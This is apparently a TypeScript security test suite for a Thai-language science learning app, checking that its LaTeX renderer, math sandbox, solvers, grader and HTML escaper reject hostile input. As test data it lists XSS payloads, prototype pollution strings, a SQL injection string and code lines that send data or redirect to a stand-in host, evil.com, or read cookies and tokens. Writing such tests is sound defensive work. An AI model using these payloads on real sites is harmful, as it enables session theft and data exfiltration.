/**
 * Security & Vulnerability Test Suite (Phase 9 QA)
 * Rigorous boundary fuzzing for XSS, Prototype Pollution, Sandboxed Scopes, and Injection Vectors.
 */

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';

import {
  renderSanitizedLatex,
  safeEvaluateMath,
  safeCompileMath,
  createSandboxedScope,
  validateExpressionSecurity,
} from './math-sanitizer.ts';

import { parseChemicalFormula } from './chemical-solver.ts';
import { solveCircuit, type CircuitNetlist } from './circuit-solver.ts';
import { evaluateCircuit, type LogicCircuit } from './logic-gate-engine.ts';
import { evaluateAnswer, type ExerciseQuestion } from './exercise-bank.ts';
import {
  safeTruncateThaiBytes,
  safeTruncateThaiGraphemes,
  escapeHtml,
  unescapeHtml,
} from './utils.ts';

describe('Security & Vulnerability Hardening Suite', () => {
  describe('1. Cross-Site Scripting (XSS) & KaTeX Injection Vectors', () => {
    it('blocks classic script tag and SVG/IMG inline event handlers in LaTeX', () => {
      const xssVectors = [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(document.cookie)>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<body onload=alert(1)>',
        '"><script>alert(1)</script>',
      ];

      for (const vector of xssVectors) {
        const rendered = renderSanitizedLatex(vector);
        // Ensure no executable HTML tags are formed
        assert.ok(
          !rendered.includes('<script>') && !rendered.includes('<script '),
          `Rendered output must not contain executable <script> tag for vector: ${vector}`
        );
        assert.ok(
          !rendered.includes('<img ') && !rendered.includes('<img/'),
          `Rendered output must not contain HTML <img tag for vector: ${vector}`
        );
        assert.ok(
          !rendered.includes('<svg ') && !rendered.includes('<svg>'),
          `Rendered output must not contain HTML <svg tag for vector: ${vector}`
        );
        assert.ok(
          !rendered.includes('<iframe'),
          `Rendered output must not contain iframe tag for vector: ${vector}`
        );
        assert.ok(
          !rendered.includes('<body'),
          `Rendered output must not contain body tag for vector: ${vector}`
        );
      }
    });

    it('neutralizes malicious KaTeX \\href and \\url protocol handlers', () => {
      const maliciousLatex = [
        '\\href{javascript:alert(1)}{Exploit}',
        '\\href{javascript%3Aalert(1)}{Exploit2}',
        '\\href{data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==}{Exploit3}',
        '\\url{vbscript:msgbox(1)}',
      ];

      for (const latex of maliciousLatex) {
        const rendered = renderSanitizedLatex(latex);
        assert.ok(
          !rendered.includes('href="javascript:'),
          `Must not permit javascript: protocol in href for: ${latex}`
        );
        assert.ok(
          !rendered.includes('href="data:text/html'),
          `Must not permit data:text/html protocol in href for: ${latex}`
        );
        assert.ok(
          !rendered.includes('href="vbscript:'),
          `Must not permit vbscript: protocol in href for: ${latex}`
        );
      }
    });

    it('safely handles malformed and deeply nested KaTeX inputs without process crash', () => {
      // Unclosed groups
      const unclosed = renderSanitizedLatex('\\frac{1}{2');
      assert.ok(typeof unclosed === 'string');

      // Random backslashes
      const randomBackslash = renderSanitizedLatex('\\\\\\\\\\');
      assert.ok(typeof randomBackslash === 'string');

      // Extremely deeply nested groups
      const deepLatex = '{'.repeat(100) + 'x' + '}'.repeat(100);
      const renderedDeep = renderSanitizedLatex(deepLatex);
      assert.ok(typeof renderedDeep === 'string');
    });
  });

  describe('2. Prototype Pollution & Sandbox Escape Prevention', () => {
    it('strictly forbids __proto__, constructor, and prototype in math expressions', () => {
      const pollutionVectors = [
        '__proto__',
        '__proto__.polluted = 1',
        'constructor',
        'constructor.prototype',
        'constructor.prototype.isAdmin = true',
        'prototype',
        'Object.prototype',
        'this.constructor',
      ];

      for (const expr of pollutionVectors) {
        assert.throws(
          () => validateExpressionSecurity(expr),
          /Security Violation/,
          `Expression "${expr}" must be rejected by security validator`
        );

        assert.throws(
          () => safeEvaluateMath(expr, {}),
          /Security Violation/,
          `safeEvaluateMath must throw on "${expr}"`
        );

        assert.throws(
          () => safeCompileMath(expr),
          /Security Violation/,
          `safeCompileMath must throw on "${expr}"`
        );
      }

      // Verify Object prototype was not tainted
      assert.strictEqual((Object.prototype as Record<string, unknown>).polluted, undefined);
      assert.strictEqual((Object.prototype as Record<string, unknown>).isAdmin, undefined);
    });

    it('strictly blocks execution of eval, Function, process, and globalThis access', () => {
      const codeExecutionVectors = [
        'eval("1+1")',
        'Function("return process")()',
        'process.exit(1)',
        'globalThis.secret = 42',
        'window.location = "http://evil.com"',
        'document.cookie',
        'require("fs")',
        'self.location = "http://evil.com"',
        'top.location.href = "http://evil.com"',
        'parent.postMessage("pwn", "*")',
        'fetch("http://evil.com/exfil")',
        'localStorage.getItem("token")',
      ];

      for (const expr of codeExecutionVectors) {
        assert.throws(
          () => validateExpressionSecurity(expr),
          /Security Violation/,
          `Expression "${expr}" must trigger security violation`
        );
      }
    });

    it('ensures Map scopes isolate user variables from prototype inheritance', () => {
      const scope = createSandboxedScope({
        a: 10,
        b: 20,
      });

      assert.strictEqual(scope.get('a'), 10);
      assert.strictEqual(scope.get('b'), 20);
      assert.strictEqual(scope.get('toString'), undefined);
      assert.strictEqual(scope.get('valueOf'), undefined);
      assert.strictEqual(scope.get('__proto__'), undefined);

      const result = safeEvaluateMath('a + b', scope);
      assert.strictEqual(result, 30);
    });
  });

  describe('3. Engine Boundary Fuzzing & Malformed Input Resistance', () => {
    it('chemical solver rejects prototype pollution in chemical formulas without throwing uncaught errors', () => {
      const attackFormulas = [
        '__proto__',
        'constructor',
        'H2O.__proto__',
        'H2(constructor)3',
        'toString',
      ];

      for (const formula of attackFormulas) {
        assert.throws(
          () => parseChemicalFormula(formula),
          /(Invalid.*chemical formula|Unknown element)/,
          `Formula "${formula}" must fail formula validation cleanly`
        );
      }
    });

    it('DC circuit solver gracefully handles disconnected, singular, or non-grounded netlists', () => {
      // Empty components
      const emptyNetlist: CircuitNetlist = {
        groundNode: '0',
        components: [],
      };
      const res1 = solveCircuit(emptyNetlist);
      assert.strictEqual(res1.success, false);

      // Circuit with no path to ground
      const floatingNetlist: CircuitNetlist = {
        groundNode: '0',
        components: [
          { id: 'v1', type: 'dc_voltage', name: 'V1', node1: '1', node2: '2', value: 12 },
          { id: 'r1', type: 'resistor', name: 'R1', node1: '1', node2: '2', value: 100 },
        ],
      };
      const res2 = solveCircuit(floatingNetlist);
      assert.ok(typeof res2.success === 'boolean');
    });

    it('logic gate engine safely handles cyclic circuits and disconnected nodes', () => {
      // Simple circuit with circular wire (output wired back to input)
      const cyclicCircuit: LogicCircuit = {
        id: 'cyclic-test',
        name: 'Cyclic Feedback Test',
        thaiName: 'การทดสอบวงจรป้อนกลับแบบวนซ้ำ',
        description: 'Test circuit with circular dependency wire',
        thaiDescription: 'วงจรทดสอบการดักจับภาวะวนซ้ำเพื่อความปลอดภัย',
        nodes: [
          { id: 'g1', type: 'NOT', label: 'NOT1', x: 100, y: 100 },
          { id: 'out1', type: 'OUTPUT', label: 'OUT', x: 200, y: 100 },
        ],
        wires: [
          { id: 'w1', fromNodeId: 'g1', toNodeId: 'g1', toPinIndex: 0 },
          { id: 'w2', fromNodeId: 'g1', toNodeId: 'out1', toPinIndex: 0 },
        ],
      };

      const result = evaluateCircuit(cyclicCircuit, {});
      assert.ok(typeof result === 'object');
      assert.strictEqual(result.hasCycles, true, 'Must detect circular dependency in circuit');
      assert.ok('out1' in result.nodeStates, 'Output node must exist in node states');
    });

    it('exercise evaluator gracefully rejects malicious or malformed user answers', () => {
      const mockQuestion: ExerciseQuestion = {
        id: 'mock-q1',
        subject: 'math',
        type: 'numeric',
        difficulty: 'easy',
        title: 'Mock Question',
        prompt: 'Compute value',
        correctAnswer: 42,
        tolerance: 0.1,
        hints: ['Hint 1'],
        explanation: { overview: 'Answer is 42', steps: ['Step 1'] },
      };

      const malformedAnswers = [
        null,
        undefined,
        NaN,
        Infinity,
        -Infinity,
        '__proto__',
        '<script>alert(1)</script>',
        { evil: true },
        [1, 2, 3],
        '42; drop table students;',
      ];

      for (const answer of malformedAnswers) {
        const graded = evaluateAnswer(mockQuestion, answer as unknown as string);
        assert.ok(typeof graded.isCorrect === 'boolean');
        assert.ok(typeof graded.feedback === 'string');
      }
    });

    it('Thai string utilities safely handle boundary edge cases and corrupted bytes', () => {
      // Empty input
      assert.strictEqual(safeTruncateThaiBytes('', 10), '');
      assert.strictEqual(safeTruncateThaiGraphemes('', 5), '');

      // Negative or zero lengths
      assert.strictEqual(safeTruncateThaiBytes('สวัสดี', 0, ''), '');
      assert.strictEqual(safeTruncateThaiGraphemes('สวัสดี', 0, ''), '');
      assert.strictEqual(safeTruncateThaiGraphemes('สวัสดี', -5, ''), '');

      // Pure ASCII
      assert.strictEqual(safeTruncateThaiBytes('Hello World', 5, ''), 'Hello');

      // Unicode non-character code points and emojis
      const mixed = '🧪 Lab เคมี 100%';
      const truncated = safeTruncateThaiGraphemes(mixed, 6);
      assert.ok(truncated.length > 0);
      assert.ok(!truncated.includes('\uFFFD'));
    });
  });

  describe('4. HTML Entity Escaping & Injection Neutralization', () => {
    it('escapes &, <, >, ", and \' characters properly into corresponding HTML entities', () => {
      const raw = 'John & "Jane" <test@example.com> \'Admin\'';
      const escaped = escapeHtml(raw);
      assert.strictEqual(
        escaped,
        'John &amp; &quot;Jane&quot; &lt;test@example.com&gt; &#39;Admin&#39;'
      );
    });

    it('neutralizes malicious HTML script, img, svg tags into unparsed entity text', () => {
      const maliciousPayloads = [
        '<script>alert("pwned")</script>',
        '<img src="x" onerror="stealCookie()" />',
        '<svg onload="alert(1)">',
        '"><script>eval(atob("..."))</script>',
        "test' onfocus='alert(1)'",
      ];

      for (const payload of maliciousPayloads) {
        const escaped = escapeHtml(payload);
        assert.ok(!escaped.includes('<'), `Must not retain raw < in: ${escaped}`);
        assert.ok(!escaped.includes('>'), `Must not retain raw > in: ${escaped}`);
        assert.ok(!escaped.includes('"'), `Must not retain raw " in: ${escaped}`);
        assert.ok(!escaped.includes("'"), `Must not retain raw ' in: ${escaped}`);
      }
    });

    it('roundtrips unescaping cleanly back to original strings', () => {
      const original = '<div class="alert font-mono">2 & 3 > 4 & 5 < 6 \'ok\'</div>';
      const escaped = escapeHtml(original);
      const unescaped = unescapeHtml(escaped);
      assert.strictEqual(unescaped, original);
    });

    it('safely preserves multilingual Thai text and scientific symbols without corruption', () => {
      const thaiFormula = 'สมการเคมี: 2H₂ + O₂ -> 2H₂O (Δm = 0.0000 g/mol, λ = 500 nm, π ≈ 3.14159)';
      const escaped = escapeHtml(thaiFormula);
      assert.ok(escaped.includes('สมการเคมี'));
      assert.ok(escaped.includes('Δm'));
      assert.ok(escaped.includes('λ'));
      assert.ok(escaped.includes('π'));
      assert.strictEqual(unescapeHtml(escaped), thaiFormula);
    });

    it('handles empty, nullish, or invalid inputs safely without throwing', () => {
      assert.strictEqual(escapeHtml(''), '');
      assert.strictEqual(unescapeHtml(''), '');
      assert.strictEqual(escapeHtml(null as unknown as string), '');
      assert.strictEqual(unescapeHtml(undefined as unknown as string), '');
      assert.strictEqual(escapeHtml(12345 as unknown as string), '');
    });
  });
});
